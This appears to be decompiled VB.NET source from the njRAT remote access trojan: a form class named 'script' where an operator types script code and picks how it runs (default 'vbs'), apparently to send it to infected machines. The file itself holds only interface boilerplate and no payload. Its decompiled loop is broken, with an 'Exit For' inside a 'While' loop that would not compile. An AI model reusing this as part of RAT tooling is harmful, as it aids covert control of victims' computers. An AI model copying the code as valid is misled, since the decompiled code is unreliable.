Imports System
Imports System.Collections.Generic
Imports System.ComponentModel
Imports System.Diagnostics
Imports System.Drawing
Imports System.Runtime.CompilerServices
Imports System.Windows.Forms
Imports Microsoft.VisualBasic.CompilerServices

Namespace NJRAT
	' Token: 0x02000025 RID: 37
	<DesignerGenerated()>
	Public Partial Class script
		Inherits Form

		' Token: 0x06000504 RID: 1284 RVA: 0x00172C18 File Offset: 0x00171018
		<DebuggerNonUserCode()>
		Private Shared Sub __ENCAddToList(value As Object)
			Dim _ENCList As List(Of WeakReference) = script.__ENCList
			SyncLock _ENCList
				Dim flag As Boolean = script.__ENCList.Count = script.__ENCList.Capacity
				If flag Then
					Dim num As Integer = 0
					Dim num2 As Integer = 0
					Dim num3 As Integer = script.__ENCList.Count - 1
					Dim num4 As Integer = num2
					While True
						Dim num5 As Integer = num4
						Dim num6 As Integer = num3
						If num5 > num6 Then
							Exit For
						End If
						Dim weakReference As WeakReference = script.__ENCList(num4)
						flag = weakReference.IsAlive
						If flag Then
							Dim flag2 As Boolean = num4 <> num
							If flag2 Then
								script.__ENCList(num) = script.__ENCList(num4)
							End If
							num += 1
						End If
						num4 += 1
					End While
					script.__ENCList.RemoveRange(num, script.__ENCList.Count - num)
					script.__ENCList.Capacity = script.__ENCList.Count
				End If
				script.__ENCList.Add(New WeakReference(RuntimeHelpers.GetObjectValue(value)))
			End SyncLock
		End Sub

		' Token: 0x170001C1 RID: 449
		' (get) Token: 0x06000507 RID: 1287 RVA: 0x00173180 File Offset: 0x00171580
		' (set) Token: 0x06000508 RID: 1288 RVA: 0x00173198 File Offset: 0x00171598
		Friend Overridable Property Panel1 As Panel
			<DebuggerNonUserCode()>
			Get
				Return Me._Panel1
			End Get
			<DebuggerNonUserCode()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As Panel)
				Me._Panel1 = value
			End Set
		End Property

		' Token: 0x170001C2 RID: 450
		' (get) Token: 0x06000509 RID: 1289 RVA: 0x001731A4 File Offset: 0x001715A4
		' (set) Token: 0x0600050A RID: 1290 RVA: 0x001731BC File Offset: 0x001715BC
		Friend Overridable Property TextBox1 As TextBox
			<DebuggerNonUserCode()>
			Get
				Return Me._TextBox1
			End Get
			<DebuggerNonUserCode()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As TextBox)
				Me._TextBox1 = value
			End Set
		End Property

		' Token: 0x170001C3 RID: 451
		' (get) Token: 0x0600050B RID: 1291 RVA: 0x001731C8 File Offset: 0x001715C8
		' (set) Token: 0x0600050C RID: 1292 RVA: 0x001731E0 File Offset: 0x001715E0
		Friend Overridable Property ComboBox1 As ComboBox
			<DebuggerNonUserCode()>
			Get
				Return Me._ComboBox1
			End Get
			<DebuggerNonUserCode()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As ComboBox)
				Me._ComboBox1 = value
			End Set
		End Property

		' Token: 0x170001C4 RID: 452
		' (get) Token: 0x0600050D RID: 1293 RVA: 0x001731EC File Offset: 0x001715EC
		' (set) Token: 0x0600050E RID: 1294 RVA: 0x00173204 File Offset: 0x00171604
		Friend Overridable Property Button1 As Button
			<DebuggerNonUserCode()>
			Get
				Return Me._Button1
			End Get
			<DebuggerNonUserCode()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As Button)
				Dim value2 As EventHandler = AddressOf Me.Button1_Click
				Dim flag As Boolean = Me._Button1 IsNot Nothing
				If flag Then
					RemoveHandler Me._Button1.Click, value2
				End If
				Me._Button1 = value
				flag = (Me._Button1 IsNot Nothing)
				If flag Then
					AddHandler Me._Button1.Click, value2
				End If
			End Set
		End Property

		' Token: 0x0600050F RID: 1295 RVA: 0x00173264 File Offset: 0x00171664
		Public Sub New()
			script.__ENCAddToList(Me)
			Me.RunAs = "vbs"
			Me.Code = String.Empty
			Me.InitializeComponent()
		End Sub

		' Token: 0x06000510 RID: 1296 RVA: 0x00173294 File Offset: 0x00171694
		Private Sub Button1_Click(sender As Object, e As EventArgs)
			Me.Code = Me.TextBox1.Text
			Me.RunAs = Me.ComboBox1.Text
			Me.Close()
		End Sub

		' Token: 0x04000256 RID: 598
		Private Shared __ENCList As List(Of WeakReference) = New List(Of WeakReference)()

		' Token: 0x04000258 RID: 600
		<AccessedThroughProperty("Panel1")>
		Private _Panel1 As Panel

		' Token: 0x04000259 RID: 601
		<AccessedThroughProperty("TextBox1")>
		Private _TextBox1 As TextBox

		' Token: 0x0400025A RID: 602
		<AccessedThroughProperty("ComboBox1")>
		Private _ComboBox1 As ComboBox

		' Token: 0x0400025B RID: 603
		<AccessedThroughProperty("Button1")>
		Private _Button1 As Button

		' Token: 0x0400025C RID: 604
		Public Code As String

		' Token: 0x0400025D RID: 605
		Public F As Form1

		' Token: 0x0400025E RID: 606
		Public RunAs As String
	End Class
End Namespace
